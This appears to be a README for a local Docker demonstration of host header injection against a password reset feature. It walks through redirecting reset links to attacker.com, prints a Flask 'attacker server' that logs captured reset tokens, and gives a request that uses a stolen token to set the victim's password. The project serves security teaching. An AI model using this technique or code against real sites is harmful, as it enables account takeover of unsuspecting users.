# Password Reset Spoof
A demonstration of Host Header Manipulation to exploit password reset functionality and capture reset tokens for unauthorized account access.

### Host Header Attack: Password Reset Exploitation

1. **Attacker Accesses Password Reset Form**:
   The attacker visits the target website (e.g., www.example.com) and enters the victim's email in the password reset form.

2. **Attacker Intercepts the Request**:
   Using a proxy tool (e.g., Burp Suite), the attacker intercepts the outgoing password reset request.

3. **Host Header Manipulation**:
   The attacker modifies the `Host` header from www.example.com to attacker.com.

4. **Server Generates Malicious Link**:
   The target server uses the manipulated `Host` header to generate a password reset link pointing to attacker.com.

5. **Victim Receives Email with Malicious Link**:
   The victim receives a legitimate-looking email containing the malicious link (e.g., https://attacker.com/reset-password?token=abc123).

6. **Victim Clicks the Malicious Link**:
   The victim unknowingly clicks the link, which redirects them to the attacker-controlled website.

7. **Attacker Captures Reset Token**:
   The attacker’s website captures the password reset token (e.g., abc123) from the victim's request.

8. **Attacker Uses the Token**:
   The attacker sends the captured token to the legitimate password reset endpoint on www.example.com and resets the victim's password, gaining control over their account.


# Step-by-Step Guide to Running the Project

This guide explains how to set up and run the project.

## Update Credentials:

![Update Credentials](images/mail_script.png)

Explanation: This step ensures the system uses the specified email credentials for sending reset emails as part of the scenario demonstration.


### Step 1: Start Docker Compose
Run the following command to start all services:
```bash
docker-compose up --build
```

### Step 2: Open Localhost Ports
Access the services running on your local machine through the following ports:

1. **Backend**: Open your browser and navigate to: http://localhost:5000
2. **Frontend**: Open your browser and navigate to: http://localhost:4567


### Step 3: Enter Victim's Email for Password Reset
In this step, the attacker enters the victim's email address into the password reset form on the legitimate website to initiate the password reset process.

Example Screenshot:
![Enter Victim Email](images/victim_email.png)

Explanation: This step triggers the password reset process, and the server will send a reset link to the victim’s email address.

### Step 4: Victim Receives Email and Clicks Malicious Link

In this step, the victim receives an email containing a password reset link generated by the manipulated `Host` header. The link appears legitimate but redirects to the attacker's website.

Example Screenshot:
![Victim Receives Email](images/password_reset_email.png)

Explanation: The victim, unaware of the attack, clicks the link (e.g., `https://attacker.com/reset-password?token=abc123`). This action redirects them to the attacker's web server, which captures the reset token from the request.


### Step 5: Attacker Captures the Token in Attacker Server

When the victim clicks the malicious reset link, they are redirected to the attacker's server. The attacker’s server (`attacker_server/main.py`) captures the reset token from the URL.

Code in `attacker_server/main.py`:
```python
@app.route('/reset-password', methods=['GET'])
def capture_token():
    token = request.args.get('token')
    if token:
        print(f"Captured Token: {token}")
        with open("captured_tokens.txt", "a") as f:
            f.write(f"Captured Token: {token}\n")
        return jsonify({"success": True, "message": "Token captured successfully"}), 200
    else:
        return jsonify({"success": False, "message": "No token found in the request"}), 400
```

### Step 6: Attacker Sends the Payload to Server Endpoint

Using the captured reset token, the attacker crafts a malicious payload and sends it to the legitimate server’s password reset confirmation endpoint (`/confirm-password`). This resets the victim's password to one chosen by the attacker.

Example Payload:
```bash
curl -Uri "http://127.0.0.1:5000/confirm-password" `
     -Method POST `
     -Headers @{ "Content-Type" = "application/json" } `
     -Body '{"token": "tQX0MRohLMSS7EI2C0nT7-WnAFszNngRwY8pTrl6jE0", "new_password": "newsecurepassword"}'
```


### Step 7: Attacker Logs in Using Victim's Email and New Password
After successfully resetting the victim's password, the attacker can now log in to the victim's account using the email and the new password they set.


# Conclusion
This demonstration highlights the risks associated with insecure password reset implementations and the exploitation of trust in the `Host` header. By manipulating the reset process, attackers can capture sensitive tokens, gain unauthorized access to user accounts, and compromise the security of the system. Implementing proper validations, such as whitelisting `Host` headers, securing reset tokens, and employing multi-factor authentication, can help mitigate these attacks.
